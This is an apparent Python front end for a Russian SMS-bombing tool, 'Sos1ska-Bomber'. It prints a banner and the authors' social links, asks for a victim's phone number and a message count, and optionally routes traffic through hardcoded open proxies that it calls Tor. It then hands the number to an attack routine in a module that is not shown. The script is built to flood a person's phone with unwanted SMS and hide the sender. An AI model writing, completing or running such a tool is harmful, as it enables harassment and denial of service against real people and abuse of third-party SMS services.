import requests
import services
import os
from colorama import Fore, Style
import time
import random

def bans():
	print('''
░██████╗░█████╗░░██████╗░░███╗░░░██████╗██╗░░██╗░█████╗░░░░░░░██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░░██████╗
██╔════╝██╔══██╗██╔════╝░████║░░██╔════╝██║░██╔╝██╔══██╗░░░░░░██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗██╔════╝
╚█████╗░██║░░██║╚█████╗░██╔██║░░╚█████╗░█████═╝░███████║█████╗███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝╚█████╗░
░╚═══██╗██║░░██║░╚═══██╗╚═╝██║░░░╚═══██╗██╔═██╗░██╔══██║╚════╝██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗░╚═══██╗
██████╔╝╚█████╔╝██████╔╝███████╗██████╔╝██║░╚██╗██║░░██║░░░░░░██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║██████╔╝
╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝░
	''')
print()
print(f'\t\t\t\tWellcome')
time.sleep(5)
os.system("clear")
bans()
print(Fore.RED + '[Sos1ska-Bomber 2.1 RU - Unix Edition]' + Style.RESET_ALL)
print()
print('Код написан им', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + 'https://vk.com/nikitasos1ska' + Style.RESET_ALL)
print()
print()
print('Наши ВК ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
f'\t\t    https://vk.com/2pac_jdm\n'
f'\t\t    https://vk.com/paket\n'
f'\t\t    https://vk.com/covidone\n' + Style.RESET_ALL)
print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
f'\t\t\thttps://github.com/Cool-Haackers\n'
f'\t\t\thttps://github.com/Ki11sesh\n' + Style.RESET_ALL)
print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com' + Style.RESET_ALL)
print()

# Установка номера телефона, а также кол-во смс
print(Fore.YELLOW + 'Введите номер телефона. Пример:' + Style.RESET_ALL, Fore.CYAN + '+79021100147' + Style.RESET_ALL)
input_number = input(Fore.GREEN + ">> " + Style.RESET_ALL)
print(Fore.YELLOW + 'Кол-во смс?' + Style.RESET_ALL)
sms = int(input(Fore.GREEN + ">> " + Style.RESET_ALL))

# Предложение от СМС-атаки через Tor
print(f"Хотите ли вы использовать  Tor Y/N? ")
is_tor = input(Fore.GREEN + ">> " + Style.RESET_ALL)

# Проверка номера

def parse_number(number):
	msg = f"[*]Проверка номера - Номер правильный!"
	if len(number) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]Проверка номера - Номер введён не правильно, проверьте номер телефона")
		time.sleep(5)
		quit()
	return number
number = parse_number(input_number)

# Tor
if str(is_tor) == "y":
	def get_tor_session():
		session = requests.session()
		session.proxies = {'http': 'http://5.252.161.48:8080',
						'http': 'http://5.252.161.48:3128',
						'http': 'http://5.252.161.48:8080',
						'http': 'http://161.35.70.249:3128',
						'http': 'http://18.132.249.194:80'}
		return session

	session = get_tor_session()
	print(session.get("http://httpbin.org/ip").text)

services.attack(number, sms)